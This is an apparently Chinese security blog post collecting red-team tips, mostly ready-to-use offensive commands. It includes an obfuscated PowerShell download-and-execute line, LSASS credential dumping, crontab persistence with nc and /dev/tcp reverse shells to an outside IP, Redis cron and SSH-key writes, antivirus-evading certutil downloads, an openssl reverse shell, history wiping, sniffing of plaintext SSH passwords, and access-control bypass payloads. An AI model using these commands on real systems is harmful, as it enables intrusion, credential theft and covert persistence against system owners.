<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
<title>
    
</title>
<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
<meta name="author" content="loecho">
<meta name="description" content="安全行业的从业人员">
<meta name="keywords" content="">
<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
    
            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
            
                <!--点击特效-->
                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
                
                        <!--CDN样式-->
                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
                        
                            <script>
                                (function() {
                                    var bp = document.createElement('script');
                                    var curProtocol = window.location.protocol.split(':')[0];
                                    if (curProtocol === 'https') {
                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
                                    } else {
                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                                    }
                                    var s = document.getElementsByTagName("script")[0];
                                    s.parentNode.insertBefore(bp, s);
                                })();
                            </script>
                            
</head>

<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo">
                <a href="https://1oecho.github.io">
                    
                </a>
            </div>

            <div class="menu navbar-right">
                
                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
                        Index
                    </a>
                    
                    <a class="menu-item" href="https://1oecho.github.io/tags">
                        Tags
                    </a>
                    
                    <a class="menu-item" href="https://github.com/loecho-sec">
                        Whoami
                    </a>
                    
                        <input id="switch_default" type="checkbox" class="switch_default">
                        <label for="switch_default" class="toggleBtn"></label>
            </div>
            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
            </form>
        </div>
    </nav>

    
        <nav class="navbar-mobile" id="nav-mobile">
            <div class="container">
                <div class="navbar-header">
                    <div>
                        <a href="https://1oecho.github.io">
                            
                        </a>
                        <!--en-->
                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
                        <!--zh-->
                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                    </div>
                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                    </form>
                    <!--en-->
                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
                    <!--zh-->
                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>

                </div>
                <div class="menu" id="mobile-menu">
                    
                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
                            Index
                        </a>
                        
                        <a class="menu-item" href="https://1oecho.github.io/tags">
                            Tags
                        </a>
                        
                        <a class="menu-item" href="https://github.com/loecho-sec">
                            Whoami
                        </a>
                        
                </div>
            </div>
        </nav>
</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementById("menu-toggle-en");
        var toggleMenu_zh = document.getElementById("menu-toggle-zh");

        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.display != "none") {
            if (toggleMenu.classList.contains("active")) {
                toggleMenu.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu.classList.add("active")
                mobileMenu.classList.add("active")
            }
        } else if (toggleMenu_zh.display != "none") {
            if (toggleMenu_zh.classList.contains("active")) {
                toggleMenu_zh.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu_zh.classList.add("active")
                mobileMenu.classList.add("active")
            }
        }

    }
</script>
            <div class="main">
                <div class="container">
                    <article class="post-wrap">
                        <header class="post-header">
                            <h1 class="post-title">
                                攻防实战：实战TIPS集合（持续更新）
                            </h1>
                            
                                    <!--zh-->
                                    <div class="post-meta zh">
                                        &#x4F5C;&#x8005;:
                                        <a itemprop="author" rel="author" href="/">
                                            
                                        </a>
                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2022-02-10</a></span>
                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
                                    href="#">31.1
                                    &#x5206;&#x949F;</a></span>
                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">6686</a></span>
                                        
                                                阅读量:
                                                <span data-hk-page="current"> - </span>
                                                
                                    </div>
                                    
                        </header>
                        
                        <div class="post-content">
                            <p>[TOC]</p>
<ul>
<li><a href="#%E7%BA%A2%E9%98%9F">红队</a></li>
</ul>
<h2 id="jar-抓包">JAR 抓包</h2>
<pre><code>java -DproxySet=true -DproxyHost=127.0.0.1 -DproxyPort=8888 -jar 你的jar包

</code></pre>
<h2 id="powershell免杀案例">Powershell免杀，案例：</h2>
<pre><code>cmd /c echo set-alias -name xz -value IEX;x^z (New-Object
&quot;NeT.WeBClienT&quot;).d^o^w^n^l^o^a^d^s^t^r^i^n^g('ht'+'tP://19’+'2.168.190.12'+'8/
a') | p^o^w^e^r^s^h^e^l^l -
</code></pre>
<h2 id="简易的linux键盘记录">简易的Linux键盘记录：</h2>
<pre><code class="language-bash"># 添加倒数第二行即可，结果查看/tmp/test

if [ -f /tmp/script.lock ];then
        rm /tmp/script.lock
else
        echo lock &gt; /tmp/script.lock
        exec script -B /tmp/test -aqf
fi
</code></pre>
<h2 id="苛刻windows命令执行">苛刻Windows命令执行：</h2>
<p>这个方法在内网中比较常用吧，有个命令执行的点，有360一类的杀软，<br>
又不好写shell，可以直接利用comsvcs.dll 的导出函数dump lsass内存，<br>
把结果放到目标web目录下，下载解密即可。</p>
<p><code>https://twitter.com/PythonResponder/status/1385064506049630211</code></p>
<ul>
<li>Remote LSASS dump without touching local disk? Yes 😃</li>
<li>On target run:</li>
<li>
<ol>
<li>net use x: \smbserver_under_your_control\c$<br>
<img src="http://showdoc.wiki.com.qax/server/index.php?s=/api/attachment/visitFile/sign/1e75a81855e3f6dc58fdec177ef39e3d" alt="" loading="lazy"></li>
</ol>
</li>
<li>
<ol start="2">
<li>powershell -c rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id x:\lassdump.bin ful</li>
</ol>
</li>
</ul>
<h2 id="java任意文件读取获取源码方式">java任意文件读取，获取源码方式</h2>
<pre><code># 读取文件：

/var/lib/mlocate/mlocate.db 

# 筛选对应war包即可
</code></pre>
<h2 id="查找web路径">查找web路径：</h2>
<pre><code>方法一 ：打开web查看源码，复制一个特征字符串，然后替换进下面命令的htmlString搜索之。

Win ：findstr /s/i/n /d:E:\code\xampp\htdocs\ /c:”htmlString” *.*
Linux：find / -name “.” | xargs grep”htmlString”

方法二 ：对于linux系统，我们也可以尝试通过history命令去查找，同样的也可以去看.bash_history

history | grep -E ‘cd|vi|ed|nano|et|mkdir|rm|find|ls|mv’ |grep -v grep | grep -E ‘www|html|nginx|apache|php|lighttp|web’ -i

方法三 ：windows系统中也可以使用dir去匹配一个特征文件名

dir /s/a-d/b E:\code\xampp\htdocs\*重复度较低的文件名（支持通配符


</code></pre>
<h2 id="linux短期权限维持">Linux短期权限维持</h2>
<pre><code class="language-bash">(crontab -l;echo '*/60 * * * * rm /tmp/yum.log;mkfifo /tmp/yum.log;cat /tmp/yum.log|/bin/sh -i 2&gt;&amp;1|/usr/bin/nc  -w 3 118.118.118.118 53 &gt;/tmp/yum.log')|crontab -
(crontab -l;echo '*/5 * * * * rm /tmp/yum.log;mkfifo /tmp/yum.log;cat /tmp/yum.log|/bin/sh -i 2&gt;&amp;1|/usr/bin/nc 118.118.118.118 53 &gt;/tmp/yum.log')|crontab -

(crontab -l;echo '*/1 * * * * exec 9&lt;&gt; /dev/tcp/118.118.118.118/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i')|crontab -

</code></pre>
<h2 id="简单操作">简单操作</h2>
<pre><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
ssh -C -f -N -g -R 3389:10.0.0.1:3389 gg@118.118.118.118

plink.exe -C -N -R 3389:127.0.0.1:3389 gg@118.118.118.118 -pw 123456 -P 443

set 0 &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/118.118.118.118/53 0&gt;&amp;1\n\n\n&quot;
config set dir /var/spool/cron
config set dbfilename root
save
config set dir /var/lib/redis
config set dbfilename dump.rdb

cat foo.txt | redis-cli -h 10.10.10.10 -x set 0
config set dir /root/.ssh
config set dbfilename &quot;authorized_keys&quot;

</code></pre>
<h2 id="windows-文件下绕过360方式">Windows 文件下绕过360方式：</h2>
<pre><code># 证书下载绕过：

1. 将路径下的certutil.exe ，复制出来，利用复制出的新的进行下载操作，并列执行俩次

copy C:\Windows\System32\certutil.exe sb.exe

sb.exe&amp;&amp;sb.exe -urlcache -split -f http://vpsIP/a.txt &amp;&amp; a.exe

2. 修改下载的路径，通过定义变量，拼接变量，来下载文件

3. 通过echo写入一个exe的hex编码，通过certutil.exe转为exe



</code></pre>
<h2 id="openssl-反弹-加密webshell">openssl 反弹 加密webshell</h2>
<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/202111082303206.png" alt="" loading="lazy"></figure>
<pre><code>＃　生成自签名证书

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

＃　服务端启动监听　8888端口：

openssl s_server -quiet -key key.pem -cert cert.pem -port 8888


＃　Ｌinux　反弹ｓｈｅｌｌ：

mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect Your ip:Your port&gt; /tmp/s; rm /tmp/s


</code></pre>
<h2 id="sqlmap-mssql-时间盲注布尔盲注-写webshell">Sqlmap mssql-时间盲注/布尔盲注 写webshell</h2>
<figure data-type="image" tabindex="2"><img src="http://showdoc.wiki.com.qax/server/index.php?s=/api/attachment/visitFile/sign/eb12be3afdcdc64fb4abbdf1fa85afd5" alt="" loading="lazy"></figure>
<pre><code># Windows 环境：

1. 找一个 特征文件： nb.jsp

2. dir /s /b index_sb.asp # 确定路径

3. for /r &quot;D:&quot; %i in (*.ashx) do echo %i # 第二种确定路径的方式

4. 直接echo

</code></pre>
<h3 id="vcenter">vcenter</h3>
<pre><code>1. getshell后通过dump内存，查找登录密码

run procdump64.exe -accepteula -ma vpxd.exe vpxd.dmp

2. 通过`PySharpSphere`dump内部主机Hash，上线

https://github.com/RicterZ/PySharpSphere

3. 通过dump数据库，获取Cookies，伪造登录

https://github.com/horizon3ai/vcenter_saml_login

</code></pre>
<h4 id="提取页面中url">提取页面中URL：</h4>
<pre><code class="language-javascript">var urls=$$('a');for(url in urls){console.log(&quot;%c#&quot;+url+&quot; - %c&quot;+urls[url].innerHTML +&quot; -- %c&quot;+urls[url].href,&quot;color:red;&quot;,&quot;color:green;&quot;,&quot;color:blue;&quot;);}
</code></pre>
<h4 id="搜索引擎语法httpsblogcsdnnetweixin_45116657articledetails102761464">搜索引擎语法：https://blog.csdn.net/weixin_45116657/article/details/102761464</h4>
<h1 id="红队">红队</h1>
<p>拿下 linux 机器,可以运行下 <code>last</code> 如果是内网机器,可以发现运维管理员的 ip 段,精准定位目标</p>
<p>也可以看下防火墙信息 <code>iptables --list</code> 也会有所收获</p>
<hr>
<p>翻数据库密码可以注意 <code>history</code> 记录也可以看下 <code>/root/.mysql_history</code> 文件</p>
<hr>
<p>偶尔跑1、2个脚本安装一下模块还是挺恼人的</p>
<p>如果经常写 python 脚本,可以使用 pipreqs 生成自己的 requirements.txt 文件,这样方便在更换主机的时候快速部署好运行环境</p>
<hr>
<h2 id="浏览器内打开-cmd">浏览器内打开 cmd</h2>
<pre><code>ms-settings:clipboard?activationSource=
</code></pre>
<h2 id="火狐">火狐</h2>
<pre><code>telnet:///
irc:///
ircs:///
mailto:///
webcal:///
</code></pre>
<hr>
<p><strong>有 wsdl/soap 不知道怎么测?除了老版本awvs以外可以使用 <a href="https://github.com/SmartBear/soapui#build-and-run">soapui</a> 直接抓取目标接口,也可用 burp 插件 <a href="https://github.com/NetSPI/Wsdler">Wsdler</a></strong></p>
<hr>
<h2 id="避免记录登录日志的小技巧">避免记录登录日志的小技巧</h2>
<pre><code class="language-bash">ssh -T user@host /bin/bash -i
</code></pre>
<p>-T 代表不要分配 tty，-i 代表要一个交互型的 bash</p>
<blockquote>
<p>来自文章 : <a href="https://www.tr0y.wang/2021/06/15/linux-system-log/">Linux 系统日志小结</a></p>
</blockquote>
<hr>
<h2 id="如何关闭-httpburp-防止蜜罐探测">如何关闭 http://burp 防止蜜罐探测</h2>
<ul>
<li>Proxy - Options - Miscellaneous - Disable web interface at http://burp</li>
</ul>
<figure data-type="image" tabindex="3"><img src="./assets/img/7.png" alt="" loading="lazy"></figure>
<hr>
<h2 id="检测暗链的小技巧使用爬虫的-user-agent-遍历访问目标对比-title-和内容">检测暗链的小技巧,使用爬虫的 user-agent 遍历访问目标,对比 title 和内容</h2>
<ul>
<li>https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Spider.txt</li>
</ul>
<hr>
<h2 id="dns收集的优先级-被动爬取过滤-主动扫描爆破">DNS收集的优先级 被动+爬取+过滤 &gt; 主动扫描+爆破</h2>
<ul>
<li>可以使用这种思路 rapid7公共数据集+js爬取+Github等第三方爬取+subfinder+OneForAll+ksubdomain过滤</li>
</ul>
<hr>
<h2 id="对于未知的webshell可以尝试爆破路径-密码">对于未知的webshell，可以尝试爆破路径、密码</h2>
<ul>
<li>webshell路径字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Webshell/Fuzz_dir.txt</li>
<li>webshell密码字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Webshell/Fuzz_webshell_pass.txt</li>
</ul>
<h2 id="也加一些参数尝试报错看会不会有密码">也加一些参数,尝试报错,看会不会有密码</h2>
<hr>
<h2 id="nc-用的不爽可以尝试换个-reverse-shell-工具推荐个-httpsgithubcomnodaufgirsh-go写的可以自动检测os并执行正确的命令将其升级为一个完整的交互式反向shell">nc 用的不爽可以尝试换个 reverse-shell 工具,推荐个 https://github.com/nodauf/Girsh ,go写的,可以自动检测OS并执行正确的命令，将其升级为一个完整的交互式反向shell。</h2>
<figure data-type="image" tabindex="4"><img src="./assets/img/5.png" alt="" loading="lazy"></figure>
<hr>
<h2 id="从反编译的-apk-文件中提取相关域名链接ip">从反编译的 apk 文件中提取相关域名链接/IP</h2>
<pre><code class="language-bash">grep -E &quot;([0-9]{1,3}[\.]){3}[0-9]{1,3}&quot; -r xxx --color=auto
grep -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; -r xxx --color=auto
</code></pre>
<hr>
<h2 id="通过正则从-apk-中提取一些敏感信息">通过正则从 apk 中提取一些敏感信息</h2>
<pre><code class="language-bash">apktool d app_name.apk
grep -EHirn &quot;accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into&quot; APKfolder/
</code></pre>
<hr>
<h2 id="如果登录系统设置了-ip-地址白名单我们可以通过修改-http-头字段伪造-ip-地址">如果登录系统设置了 IP 地址白名单,我们可以通过修改 http 头字段伪造 IP 地址</h2>
<ul>
<li>http 头字段字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Fuzz_head.txt</li>
</ul>
<p>或者直接修改 host 头</p>
<pre><code>curl -v -H &quot;Host: localhost&quot; https://target/
wget -d --header=&quot;Host: localhost&quot; https://target/
</code></pre>
<hr>
<p>有时候文件太大,想先确认一下文件结构和部分内容,这时可以使用 remotezip,直接列出远程 zip 文件的内容，而无需完全下载,甚至可以远程解压,仅下载部分内容</p>
<pre><code class="language-bash">pip3 install remotezip
remotezip -l &quot;http://site/bigfile.zip&quot;          # 列出远程zip文件的内容
remotezip &quot;http://site/bigfile.zip&quot; &quot;file.txt&quot;  # 从远程zip⽂件解压出file.txt
</code></pre>
<hr>
<p>URL跳转漏洞字典: https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_Redirect.txt</p>
<hr>
<p>burp 在忽略目标的时候是配置 Intercept Client Requests , 但是这个选项不支持批量导入, 只能一条一套的添加, 非常反人类, 所以 windows 下可以通过 Proxifier 配置 Rules 做到忽略指定的 host</p>
<figure data-type="image" tabindex="5"><img src="./assets/img/4.png" alt="" loading="lazy"></figure>
<p>附赠一个 Target hosts 列表</p>
<ul>
<li>https://github.com/ffffffff0x/AboutSecurity/blob/master/Payload/Burp/Proxifier_filter.txt</li>
</ul>
<hr>
<p>npm 和 github 加速可以使用 jsdelivr 的 cdn 进行加速,但 jsdelivr 不支持 release 的发布文件下载,可以采用 cf worker 部署的代理服务进行加速</p>
<hr>
<p>在 linux 中不知道当前用户可用什么命令，可以使用下面的命令，这条命令可以列出所有可用的命令(有点拗口)</p>
<pre><code>compgen -c
</code></pre>
<hr>
<h2 id="火绒拦截扫描如何关闭拦截">火绒拦截扫描，如何关闭拦截？</h2>
<ul>
<li>火绒&gt;网络防护&gt;基础防护中关闭</li>
</ul>
<figure data-type="image" tabindex="6"><img src="./assets/img/1.png" alt="" loading="lazy"></figure>
<hr>
<h2 id="druid-未授权访问常见路径">druid 未授权访问常见路径</h2>
<ul>
<li>/druid/websession.html</li>
<li>/system/druid/websession.html</li>
<li>/webpage/system/druid/websession.html</li>
</ul>
<hr>
<h2 id="爆破目标用户名时应考虑如下可能">爆破目标用户名时应考虑如下可能：</h2>
<ul>
<li>撞库</li>
<li>常见手机号</li>
<li>常见登录账号(admin、manager、test、deme)</li>
<li>数字组合(0-9、00-99、000-999、0000-9999、00000-99999)</li>
<li>拼音(zhangsan、zhang.san、zhangs)</li>
<li>中文(张三、李四、张san)</li>
<li>英文名(Tom、Jeo、Cherry)</li>
<li>单位名(zssx123、zssx@123)</li>
<li>地名(beijing123、beijing@123)</li>
<li>组合(地名+单位名)</li>
<li>域名(baidu@123、JD@123)</li>
<li>生日组合</li>
</ul>
<hr>
<h2 id="整理字典时推荐用linux下的工具快速合并和去重">整理字典时，推荐用linux下的工具快速合并和去重</h2>
<pre><code class="language-bash">cat file1.txt file2.txt fileN.txt &gt; out.txtsort out.txt | uniq &gt; out2.txt
</code></pre>
<hr>
<h2 id="信息收集小技巧仔细观察目标页面的js路径多找几个js目录专门用js字典进行爆破获取的js脚本列表再调用工具去匹配路径和凭证">信息收集小技巧，仔细观察目标页面的js路径，多找几个js目录，专门用js字典进行爆破，获取的js脚本列表，再调用工具去匹配路径和凭证。</h2>
<hr>
<h2 id="有时一些上传点没有过滤但你访问文件是通过函数调用获取文件这个时候可以先测下任意文件读然后尝试get改为post在测试任意文件读如果存在尝试通过任意文件读找路径">有时一些上传点没有过滤,但你访问文件是通过函数调用获取文件,这个时候可以先测下任意文件读,然后尝试get改为post在测试任意文件读,如果存在,尝试通过任意文件读找路径</h2>
<hr>
<p>打某一个行业想要有成果，最好要深入了解这个行业，我举个例子，比如搞传奇/dnf这种私服的，他们讲管理员都叫gm，不像搞IT的叫admin，那你爆一些私服游戏的网页后台、管理账号就需要搞一些行业黑话生成一下，比如/gm/或者/chongzhi/gm.php,用IT行业的字典，水土不服🤣，还有菠菜行业，注册用户需要6位邀请码，很多都是888888、666666这种吉利数字，逆向一下思路，猜一猜目标受众喜欢什么。</p>
<hr>
<p>我们在后渗透过程中经常要传 payload 到目标，临时起的文件服务器都是 python 一条命令的事</p>
<ul>
<li>
<p>Python 2.x</p>
<pre><code class="language-bash">python -m SimpleHTTPServer 8000# 在当前目录起个 8000 端口的 HTTP 服务
</code></pre>
</li>
<li>
<p>Python 3.x</p>
<pre><code class="language-bash">python -m http.server 8000 --bind 0.0.0.0
</code></pre>
</li>
<li>
<p>推荐一个可以加密码的，一条命令python服务器模块</p>
<pre><code>pip3 install updogupdog --port 8888 --password test1234
</code></pre>
</li>
</ul>
<hr>
<p>一般来说,某些场景多个服务是协同的关系,比如就这个 LiveCMS 服务一定和下面的监控设备有连接，不然日志不会这么大，可以搞一搞下级监控，也可以专门搞一搞这个 LiveCMS 和 LiveSMS、LiveGBS 试试<br>
LiveCMS 端口使用</p>
<ul>
<li>TCP 端口 : 5060(SIP), 10000(HTTP), 26379(Redis)</li>
<li>UDP 端口 : 5060(SIP)</li>
</ul>
<p>LiveSMS : SIP 流媒体服务, 根据需要可部署多套</p>
<ul>
<li>TCP 端口 : 5070(SIP), 10001(HTTP), 11935(RTMP Live), 30000-40000(RTP over TCP)</li>
<li>UDP 端口 : 5070(SIP), 50000-60000(RTP/RTCP over UDP)</li>
</ul>
<hr>
<p>有时候我们拿了一台 docker 机器，发现没有 ifconfig 命令也没有 ip 命令，不清楚怎么看 IP，这时候可以通过查看 proc 文件的方式来查看</p>
<pre><code class="language-bash">cat /proc/net/fib_triecat /etc/sysconfig/network
</code></pre>
<hr>
<p>渗透时遇到某些上传点未作过滤，但负载均衡做了过滤后缀名的情况，可以上传 webshell 命名为 index.php，然后访问 xxx.com/xxx/upload, 尝试 bypass 反代的策略</p>
<hr>
<p>当渗透时遇到了 403 或者 302、401 的拒绝访问，不要怕，多 FUZZ 几次</p>
<ul>
<li>
<p>从 HTTP Header 层面 bypass</p>
<pre><code class="language-bash">GET /admin HTTP/1.1Host: web.com   # ===&gt; 403GET /anything HTTP/1.1Host: web.comX-Original-URL: /admin  # ===&gt; 200GET /anything HTTP/1.1Host: web.comReferer: https://web.com/admin  # ===&gt; 200GET https://qq.com HTTP/1.1Host: web.com   # ===&gt; SSRF
</code></pre>
</li>
<li>
<p>从 URL 参数层面 bypass</p>
<pre><code class="language-bash">/admin/panel    # ===&gt; 403/admin/monitor  # ===&gt; 200/admin/monitor/;panel   # ===&gt; 302
</code></pre>
<pre><code class="language-bash">web.com/admin   # ===&gt; 403web.com/ADMIN       # ===&gt; 200web.com/admin/      # ===&gt; 200web.com/admin/.     # ===&gt; 200web.com//admin//    # ===&gt; 200web.com/./admin/./  # ===&gt; 200web.com/./admin/..  # ===&gt; 200web.com/%2f/admin/  # ===&gt; 200web.com/admin.json  # ===&gt; 200(ruby)web.com/%2e/admin   # ===&gt; 200web.com/%252e/admin # ===&gt; 200web.com/%ef%bc%8fadmin  # ===&gt; 200web.com/admin       # ===&gt; 302web.com/admin..;/   # ===&gt; 200
</code></pre>
</li>
<li>
<p>从协议层面 bypass</p>
<pre><code class="language-bash">http://web.com/admin    # ===&gt; 403https://web.com/admin   # ===&gt; 200
</code></pre>
</li>
</ul>
<hr>
<p>当我们拿下 windows 机器时可以通过抓内存中的密码进行横向，但 linux 却不可能抓到内存中的密码，但是 Debian 系列下的 linux 系统可以通过监听 sshd 进程的数据抓取出明文密码，比如你拿下了一台管理员机器，上面有 xshell，你可以手动开一个监听，在开一个登录，监听的窗口上就抓出密码了</p>
<pre><code class="language-bash">strace -xx -fp `cat /var/run/sshd.pid` 2&gt;&amp;1| grep --line-buffered -P 'write\(\d, &quot;\\x00' | perl -lne '$|++; @F=/&quot;\s*([^&quot;]+)\s*&quot;/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
</code></pre>
<p>当然你也可以直接用工具抓 xshell 存的密码</p>
<ul>
<li><a href="https://github.com/Arvanaghi/SessionGopher">Arvanaghi/SessionGopher</a> - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本</li>
<li><a href="https://github.com/uknowsec/SharpDecryptPwd">uknowsec/SharpDecryptPwd</a> - 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品(Xshell,Xftp)。</li>
</ul>
<hr>
<p>渗透时尽量不要暴露自己的 IP 地址，挂代理是必须的</p>
<ul>
<li>linux 下要查看自己终端是否走代理可以 curl https://ifconfig.me/ 看下返回的 IP 地址</li>
<li>windows 就直接访问 https://ifconfig.me/ 即可</li>
</ul>
<hr>
<p>linux 下代理不用多说, proxychains-ng，windows 下推荐用 Proxifier</p>
<hr>
<p>MSF 和 CS 中 Stage 与 Stageless 的区别</p>
<ul>
<li>Stage ： 先传一个 shellcode，然后回连端口，加载恶意 metsrv，然后再请求 stdapi 于 priv，进行上线</li>
<li>Stageless ： 将 shellcode、metsrv、stdapi、priv 打包，一次性传完</li>
<li>如果想让 msf 直接回弹到 NC，那么必须要用 stageless</li>
</ul>
<hr>
<p>判断目标主机是不是虚拟机、容器</p>
<ul>
<li>
<p>windows</p>
<ul>
<li>cmd : systeminfo</li>
<li>Powershell : get-wmiobject win32_computersystem | fl model</li>
</ul>
</li>
<li>
<p>linux</p>
<pre><code class="language-bash">lshw -class system | grep -i VM &amp; grep -i virtualdmesg | grep -i VM &amp; grep -i virtualdmidecode -s system-product-namels /tmpsystemd-detect-virtvirt-whatls -alh /.dockerenvcat /proc/1/cgroup
</code></pre>
</li>
</ul>
<hr>
<p>msf 框架其实有许多 UI 界面的工具, 可以帮助不习惯命令行的渗透测试人员进行渗透，我举几个例子</p>
<ul>
<li>https://github.com/FunnyWolf/Viper</li>
<li>https://github.com/WayzDev/Kage</li>
</ul>
<hr>
<p>在进行云主机后渗透时，如果触发敏感操作，会有短信提醒到管理员手机上，这个时候可以酌情考虑卸载云主机的监控 (有时你用云主机装 SSR 会无法连接也是这个原因)</p>
<hr>
<p>rlwrap 工具，可以完美解决各类 shell 中无法上下左右的问题</p>
<p>例如 ，回弹了 shell，手贱按了上，这种情况(我想你一定遇到过🤣🤣🤣🤣)</p>
<ul>
<li>
<p>安装：</p>
<pre><code class="language-bash">apt install rlwrap
</code></pre>
</li>
<li>
<p>使用：</p>
<pre><code class="language-bash">rlwrap [Command]
</code></pre>
</li>
</ul>
<hr>
<p>cAdvisor 是 Google 出品的用于监控 Docker 容器的服务，渗透时遇到这个服务基本上是存在容器环境</p>
<hr>
<p>新版 kali 2020 版后使用 root 账号默认不给密码，如果你想,可以直接进行修改 : sudo passwd root</p>
<hr>
<p>nc 具有多个版本, 比如: traditional、openbsd、ncat</p>
<ul>
<li>
<p>traditional 最老的版本,支持最基本的功能</p>
</li>
<li>
<p>openbsd 安全版本,回弹要用一大段命令</p>
<pre><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f
</code></pre>
</li>
<li>
<p>ncat 新版本, 重构了旧版的代码并支持了许多新功能, debian 系列发行版下通过以下命令进行安装配置</p>
<pre><code class="language-bash">apt install -y ncatupdate-alternatives --set nc /usr/bin/ncat
</code></pre>
</li>
</ul>
<hr>
<p>程序溢出，int 最大值为 2147483647，可尝试使用该值进行整数溢出，观察现象。</p>
<blockquote>
<p>来自项目 : <a href="https://github.com/Power7089/PenetrationTest-Tips">Power7089/PenetrationTest-Tips</a></p>
</blockquote>
<hr>
<p>图片验证码可设置为空，如：code=undefined</p>
<blockquote>
<p>来自项目 : <a href="https://github.com/Power7089/PenetrationTest-Tips">Power7089/PenetrationTest-Tips</a></p>
</blockquote>
<p>也可以使用字典进行 fuzz</p>
<ul>
<li>https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_imagesize.txt</li>
</ul>
<hr>
<p>任意文件下载：/porc/self/cmdline -- 当前进程的 cmdline 参数，/var/lib/mlocate/mlocate.db -- 全文件路径。</p>
<blockquote>
<p>来自项目 : <a href="https://github.com/Power7089/PenetrationTest-Tips">Power7089/PenetrationTest-Tips</a></p>
</blockquote>
<hr>
<ul>
<li>138888888889   12 位经过短信网关取前 11 位，导致短信轰炸</li>
